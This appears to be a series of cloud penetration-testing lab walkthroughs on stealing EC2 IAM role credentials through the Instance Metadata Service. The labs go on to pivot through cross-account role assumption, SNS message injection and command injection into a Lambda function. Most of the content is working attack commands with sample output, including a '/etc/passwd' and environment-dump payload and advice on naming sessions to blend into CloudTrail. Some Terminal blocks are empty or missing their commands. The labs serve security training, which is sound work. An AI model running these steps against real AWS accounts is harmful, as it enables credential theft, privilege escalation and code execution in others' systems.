Objective: Steal IAM role credentials from an EC2 instance via the unprotected Instance Metadata Service v1 (IMDSv1) and configure them locally for further AWS API exploitation.
Prerequisites:
  • Shell access on a target EC2 instance (via SSH, SSM session, or SSRF-based access)
  • The target EC2 instance must have an IAM role attached and IMDSv1 enabled (HttpTokens: optional)
  • AWS CLI v2 installed on your attacker machine (aws --version should show 2.x)
  • curl and jq available on the target instance
  • No prior lab dependency — this is the entry point for the M06 chain
1
Query the IMDS base URL to enumerate available metadata categories. IMDSv1 requires no authentication — any HTTP GET from the instance is answered immediately. This confirms IMDS is accessible and reveals available data paths.
Terminal
$ curl http://169.254.169.254/latest/meta-data/
ami-id ami-launch-index ami-manifest-path block-device-mapping/ events/ hostname iam/ identity-credentials/ instance-action instance-id instance-life-cycle instance-type local-hostname local-ipv4 mac metrics/ network/ placement/ profile public-hostname public-ipv4 public-keys/ reservation-id security-groups services/
2
Navigate to the IAM security credentials path to discover the name of the IAM role attached to this EC2 instance. The trailing slash causes IMDS to list the role name(s) rather than return credential JSON. This is step one of the required two-step credential theft flow.
Terminal
$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
EC2-Admin-Role
3
Request the temporary STS credentials for the discovered role by appending the role name to the path. These are the same credentials the instance uses for all AWS API calls — they rotate automatically every few hours, so capture them promptly. Note the ASIA prefix on the AccessKeyId, which indicates STS-issued temporary credentials rather than long-term IAM keys.
Terminal
$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Admin-Role
{ "Code" : "Success", "LastUpdated" : "2024-01-15T09:30:00Z", "Type" : "AWS-HMAC", "AccessKeyId" : "ASIAZQ3DEXAMPLEKEY", "SecretAccessKey" : "wJalrXUtnFEMI/K7MDENG/bPxRfEXAMPLEKEY", "Token" : "FwoGZXIvYXdzEBYaDH2k7eC3a...truncated...rKE8lPYjTuEkamplE=", "Expiration" : "2024-01-15T15:45:00Z" }
4
Configure the stolen credentials as a named AWS CLI profile on your attacker machine. Using a named profile avoids polluting your shell environment and lets you switch contexts cleanly. The session token is mandatory for STS temporary credentials — omitting it causes all API calls to fail with InvalidClientTokenId.
Terminal
$ aws configure set aws_access_key_id ASIAZQ3DEXAMPLEKEY --profile stolen
$ aws configure set aws_secret_access_key wJalrXUtnFEMI/K7MDENG/bPxRfEXAMPLEKEY --profile stolen
$ aws configure set aws_session_token FwoGZXIvYXdzEBYaDH2k7eC3a...truncated...rKE8lPYjTuEkamplE= --profile stolen
$ aws configure set region us-east-1 --profile stolen
# No output on success — the credentials are written to ~/.aws/credentials
5
Verify that the stolen credentials work by checking the caller identity using the named profile. You are now operating as the EC2 instance's IAM role from your attacker machine. The AssumedRoleId in the response confirms you hold role credentials, not long-term IAM user credentials.
Terminal
$ aws sts get-caller-identity --profile stolen
{ "UserId": "AROAZQ3DEXAMPLEID:i-0abc123def456", "Account": "123456789012", "Arn": "arn:aws:sts::123456789012:assumed-role/EC2-Admin-Role/i-0abc123def456" }

Detection Note: IMDSv1 access is NOT logged to CloudTrail by default. There is no API event generated when credentials are fetched via IMDS. The first detectable signal appears when the stolen credentials are used externally — look for CloudTrail events from unexpected source IP addresses. GuardDuty rule InstanceCredentialExfiltration.OutsideAWS fires if credentials issued by EC2 are used from a non-AWS IP. MITRE ATT&CK: T1552.005 — Unsecured Credentials: Cloud Instance Metadata API.
Cleanup:
  • Remove the stolen profile from your attacker machine: manually delete the [stolen] sections from ~/.aws/credentials and ~/.aws/config
  • The IMDS credentials are temporary (STS) and expire automatically — verify with aws sts get-caller-identity --profile stolen returning an auth error after expiry
  • No AWS-side resources were created in this lab — no further cleanup required
Objective: Understand IMDSv2 protections, learn the correct two-step token flow, identify instances enforcing IMDSv2, and exploit scenarios where misconfiguration (HttpPutResponseHopLimit > 1) re-opens the attack surface from containers or proxied requests.
Prerequisites:
  • Completion of M06-L01 (understand IMDSv1 baseline)
  • Shell access on a target EC2 instance with IMDSv2 enforced (HttpTokens: required)
  • A second test instance or container environment with HttpPutResponseHopLimit: 2 for the hop-limit bypass section
  • curl available on the instance; AWS CLI v2 on attacker machine for the enforcement check
  • IAM permission ec2:DescribeInstances with the stolen credentials from L01 (to run the enforcement check command)
1
Attempt the standard IMDSv1 unauthenticated GET against an instance with IMDSv2 enforced. The 401 response confirms that HttpTokens: required is in effect — unauthenticated IMDS requests are rejected entirely. This is the correct security posture.
Terminal
$ curl -s http://169.254.169.254/latest/meta-data/
<?xml version="1.0" encoding="iso-8859-1"?> <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"> <html><head><title>401 - Unauthorized</title></head> <body><h1>401 - Unauthorized</h1></body></html>
2
Obtain an IMDSv2 session token using a PUT request — this is the critical distinction from IMDSv1. The X-aws-ec2-metadata-token-ttl-seconds header specifies how long the token remains valid (maximum 21600 seconds / 6 hours). The PUT method was chosen specifically to break simple SSRF exploits that can only send GET requests.
Terminal
$ TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \ -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
$ echo $TOKEN
AQAEAHjQ2Xyb8f0pMG7s1nExAmPlEtOkEn9z4rQ5sJ...
3
Use the session token to query metadata. Pass it in the X-aws-ec2-metadata-token request header. With a valid token, you have identical access to what IMDSv1 provided. First get the role name, then fetch the credentials — the same two-step flow as IMDSv1.
Terminal
$ curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \ http://169.254.169.254/latest/meta-data/iam/security-credentials/
EC2-Admin-Role
$ curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \ http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Admin-Role
{ "Code" : "Success", "LastUpdated" : "2024-01-15T09:30:00Z", "Type" : "AWS-HMAC", "AccessKeyId" : "ASIAZQ3DEXAMPLEKEY", "SecretAccessKey" : "wJalrXUtnFEMI/K7MDENG/bPxRfEXAMPLEKEY", "Token" : "FwoGZXIvYXdzEBYaDH2k7eC3a...truncated...", "Expiration" : "2024-01-15T15:45:00Z" }
4
From your attacker machine, check the metadata enforcement settings for all target instances. HttpTokens: required means IMDSv2 only. HttpTokens: optional means IMDSv1 is still available. The HttpPutResponseHopLimit field is critical — a value of 2 or higher re-opens IMDS exploitation from containers on the host because the PUT response can traverse the container's virtual network interface.
Terminal
$ aws ec2 describe-instances \ --query 'Reservations[*].Instances[*].[InstanceId,MetadataOptions]' \ --output json --profile stolen | python3 -m json.tool
[ [ [ "i-0abc123def456", { "State": "applied", "HttpTokens": "required", "HttpPutResponseHopLimit": 2, "HttpEndpoint": "enabled", "HttpProtocolIpv6": "disabled", "InstanceMetadataTags": "disabled" } ] ] ]
5
Exploit the elevated hop-limit from within a container running on the EC2 host. Container environments like ECS and EKS commonly set HttpPutResponseHopLimit: 2 to allow containers to access IMDS. This means a compromised container can perform the full IMDSv2 token exchange and steal the host EC2 role credentials — the same outcome as IMDSv1 from a container's perspective.
Terminal
# From inside a container on the EC2 instance (hop-limit = 2 allows this):
$ TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \ -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
$ curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \ http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Admin-Role
{ "Code" : "Success", "LastUpdated" : "2024-01-15T09:30:00Z", "Type" : "AWS-HMAC", "AccessKeyId" : "ASIAZQ3DCONTAINERKEY", "SecretAccessKey" : "ContainerSecretKeyEXAMPLE/K7MDENG", "Token" : "FwoGZXIvYXdzEBYaDH2k7eC3a...truncated...", "Expiration" : "2024-01-15T18:00:00Z" }

Detection Note: IMDSv2 token requests are not logged to CloudTrail any more than IMDSv1 requests. The same detection gap applies — credential theft from IMDS goes unlogged until the credentials are used externally. The hop-limit bypass is especially insidious because it is a legitimate configuration for ECS/EKS. GuardDuty: InstanceCredentialExfiltration.OutsideAWS. Cleanup:
  • No AWS resources are created in this lab — no infrastructure to tear down
  • Remove any stolen credential profiles from ~/.aws/credentials on the attacker machine

Objective: Use stolen EC2 role credentials to enumerate assumable IAM roles, inspect trust policies, and perform cross-account role assumption to pivot into a second AWS account.
Prerequisites:
  • Completion of M06-L01 or M06-L02 — stolen EC2 role credentials configured as the stolen AWS CLI profile
  • The stolen role must have iam:ListRoles and iam:GetRole permissions (common on admin-style EC2 roles)
  • Target environment must have a cross-account trust relationship configured (pre-built in the lab environment)
  • AWS CLI v2 on attacker machine
1
Use the stolen credentials (configured in the stolen profile from L01) to enumerate all IAM roles in the account. Look for names suggesting elevated privileges, cross-account access, or deployment automation — these are prime pivot targets.
Terminal
$ aws iam list-roles --query 'Roles[*].[RoleName,Arn]' --output table --profile stolen
---------------------------------------------------------------------- | ListRoles | +-------------------------+------------------------------------------+ | EC2-Admin-Role | arn:aws:iam::123456789012:role/EC2-Admin-Role | | CrossAccountAdmin | arn:aws:iam::987654321098:role/CrossAccountAdmin | | LambdaExecutionRole | arn:aws:iam::123456789012:role/LambdaExecutionRole | | S3-Backup-Role | arn:aws:iam::123456789012:role/S3-Backup-Role | | DevOps-Deploy | arn:aws:iam::123456789012:role/DevOps-Deploy | +-------------------------+------------------------------------------+
2
Inspect the trust policy of high-value targets. The trust policy (also called the assume-role policy) defines who is allowed to call sts:AssumeRole. A trust policy referencing our stolen role's ARN or the entire account number means we can pivot into it.
Terminal
$ aws iam get-role --role-name CrossAccountAdmin \ --query 'Role.AssumeRolePolicyDocument' --profile stolen
{ "Version": "2012-10-17", "Statement": [ { "Effect": "Allow", "Principal": { "AWS": "arn:aws:iam::123456789012:role/EC2-Admin-Role" }, "Action": "sts:AssumeRole", "Condition": {} } ] }
3
Confirm the permissions our stolen identity has before attempting role assumption. The simulate-principal-policy API lets you test IAM policies without making live API calls — useful for pre-flight permission checks that avoid generating unnecessary denied-access CloudTrail noise.
Terminal
$ aws iam simulate-principal-policy \ --policy-source-arn arn:aws:iam::123456789012:role/EC2-Admin-Role \ --action-names sts:AssumeRole \ --resource-arns arn:aws:iam::987654321098:role/CrossAccountAdmin \ --query 'EvaluationResults[*].[EvalActionName,EvalDecision]' \ --output table --profile stolen
------------------------------------------- | SimulatePrincipalPolicy | +----------------+------------------------+ | sts:AssumeRole | allowed | +----------------+------------------------+
4
Assume the target role. The trust policy explicitly allows our stolen EC2-Admin-Role to assume it. This call returns a new set of temporary credentials scoped to the cross-account role in account 987654321098. Choose a --role-session-name that blends in with normal operations to avoid standing out in CloudTrail.
Terminal
$ aws sts assume-role \ --role-arn arn:aws:iam::987654321098:role/CrossAccountAdmin \ --role-session-name deploy-automation \ --profile stolen
{ "Credentials": { "AccessKeyId": "ASIAZQ3DCROSSACCTKEY", "SecretAccessKey": "CrossAcctSecretKeyEXAMPLE/K7MDENG", "SessionToken": "FwoGZXIvYXdzEBYaDCrossAccount...truncated...", "Expiration": "2024-01-15T16:30:00Z" }, "AssumedRoleUser": { "AssumedRoleId": "AROAZQ3DCROSSROLE:deploy-automation", "Arn": "arn:aws:sts::987654321098:assumed-role/CrossAccountAdmin/deploy-automation" } }
5
Configure the cross-account credentials as a second named profile and verify you are now operating in the target account. The Account field in the response should show account 987654321098 — a different account than where you started.
Terminal
$ aws configure set aws_access_key_id ASIAZQ3DCROSSACCTKEY --profile pivot
$ aws configure set aws_secret_access_key CrossAcctSecretKeyEXAMPLE/K7MDENG --profile pivot
$ aws configure set aws_session_token FwoGZXIvYXdzEBYaDCrossAccount...truncated... --profile pivot
$ aws configure set region us-east-1 --profile pivot

{ "UserId": "AROAZQ3DCROSSROLE:deploy-automation", "Account": "987654321098", "Arn": "arn:aws:sts::987654321098:assumed-role/CrossAccountAdmin/deploy-automation" }

Objective: Discover SNS topics using stolen EC2 role credentials, enumerate subscriptions to map downstream Lambda/SQS targets, verify topic access policy, and publish crafted messages to trigger downstream execution.
Prerequisites:
  • Completion of M06-L01 — stolen EC2 role credentials configured as the stolen AWS CLI profile
  • The stolen role must have sns:ListTopics, sns:GetTopicAttributes, sns:ListSubscriptionsByTopic, and sns:Publish permissions
  • Lab environment must have pre-deployed SNS topics with Lambda and SQS subscriptions
  • jq installed on attacker machine for JSON parsing
1
List all SNS topics in the account to discover the messaging infrastructure. The API returns up to 100 topics per page — use --next-token to paginate if the account has more. The full topic ARN (not just the name) is required for all subsequent SNS API calls including sns:Publish.
Terminal
$ aws sns list-topics --query 'Topics[*].TopicArn' --output text --profile stolen
arn:aws:sns:us-east-1:123456789012:process-orders arn:aws:sns:us-east-1:123456789012:user-notifications arn:aws:sns:us-east-1:123456789012:system-alerts arn:aws:sns:us-east-1:123456789012:deploy-events
# If NextToken is present in the full response, paginate:
$ aws sns list-topics --next-token <token_value> --query 'Topics[*].TopicArn' --output text --profile stolen
# Additional topic ARNs would appear here in environments with more than 100 topics
2
Retrieve the full attributes for a high-value topic. This reveals the subscription count, owner account, and — critically — the access policy. A policy with Principal: * on SNS:Publish means any authenticated AWS identity can inject messages, regardless of account.
Terminal

3
List all subscriptions for the target topic to discover downstream services. Confirm subscriptions are in Confirmed state — PendingConfirmation subscriptions do not receive messages. Knowing that Lambda and SQS are subscribed tells us that publishing to this topic will trigger code execution and queue processing.

4
Publish a crafted message to the topic using its full ARN — the topic name alone is not accepted. The --message payload is delivered as-is to all subscribers — Lambda receives it as a JSON SNS event, SQS stores it as a message body. This triggers the subscribed Lambda function immediately.
Terminal
$ aws sns publish \ --topic-arn arn:aws:sns:us-east-1:123456789012:process-orders \ --subject "Order Processing Test" \ --message '{"action":"processOrder","orderId":"1337","customer":"attacker","amount":0}' \ --profile stolen
{ "MessageId": "a1b2c3d4-e5f6-7890-abcd-1234567890ef" }

Check CloudWatch Logs to confirm the Lambda function was triggered by the published message. The log output shows our injected orderId: 1337 was processed, confirming successful Lambda invocation via SNS publish.

Objective: Chain IMDS credential theft through SNS message publishing to achieve code execution inside a Lambda function, demonstrating a full cross-service pivot from EC2 to serverless.
Prerequisites:
  • Completion of M06-L01 through M06-L04 — you should understand IMDS credential theft, role assumption, and SNS topic enumeration before attempting this chained lab
  • Shell access on the target EC2 instance with IMDSv1 or IMDSv2 access (hop-limit 2)
  • curl, jq, and aws CLI installed on the target EC2 instance or your attacker machine
  • Lab environment must have a deployed data-pipeline-trigger SNS topic with a vulnerable Lambda (processor) subscribed — this Lambda intentionally passes SNS message content to a shell execution function to simulate an injection vulnerability
  • CloudWatch Logs read access (logs:DescribeLogStreams, logs:GetLogEvents) for the EC2 role
1
Steal EC2 instance role credentials via IMDS in a single automated script. This combines the role name discovery and credential extraction from L01 into a chained sequence using jq for JSON parsing. These credentials become our initial foothold for the entire chain.
Terminal
$ ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
$ CREDS=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE)
$ export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r .AccessKeyId)
$ export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r .SecretAccessKey)
$ export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r .Token)
$ aws sts get-caller-identity --query 'Arn' --output text
arn:aws:sts::123456789012:assumed-role/EC2-Admin-Role/i-0abc123def456
2
Enumerate SNS topics using the stolen EC2 role credentials. The AWS CLI picks up the credentials from the environment variables set in step 1. Note that we are calling AWS APIs directly using the instance role — no named profile needed in this chained approach.
Terminal

3
Identify which topic has a Lambda subscriber — this is the bridge from SNS messaging to code execution. Verify subscription state is Confirmed before attempting to publish. The data-pipeline-trigger topic with a Lambda function and a dead-letter SQS queue subscribed is our target.
Terminal
$ aws sns list-subscriptions-by-topic \ --topic-arn arn:aws:sns:us-east-1:123456789012:data-pipeline-trigger \ --query 'Subscriptions[*].[Protocol,Endpoint]' --output table
--------------------------------------------------------------------- | ListSubscriptionsByTopic | +---------+---------------------------------------------------------+ | lambda | arn:aws:lambda:us-east-1:123456789012:function:processor | | sqs | arn:aws:sqs:us-east-1:123456789012:pipeline-dlq | +-------------------------------------------------------------+
4
Publish a crafted injection payload to the topic using the full topic ARN. The vulnerable processor Lambda passes the message's cmd field directly to a shell execution call without sanitization. The SNS service is the delivery mechanism, but the vulnerability lives in the Lambda code itself — a server-side injection via the messaging layer.
Terminal
$ aws sns publish \ --topic-arn arn:aws:sns:us-east-1:123456789012:data-pipeline-trigger \ --message '{"cmd":"id && cat /etc/passwd && env | grep AWS"}'
{ "MessageId": "b2c3d4e5-f678-9012-abcd-ef1234567890" }
5
Read the Lambda function's CloudWatch Logs to retrieve the command output. Get the most recent log stream first, then pull log events. The output confirms code execution inside Lambda — note that Lambda runs with its own IAM execution role, which may have different (potentially higher) permissions than the EC2 role used to trigger this chain.
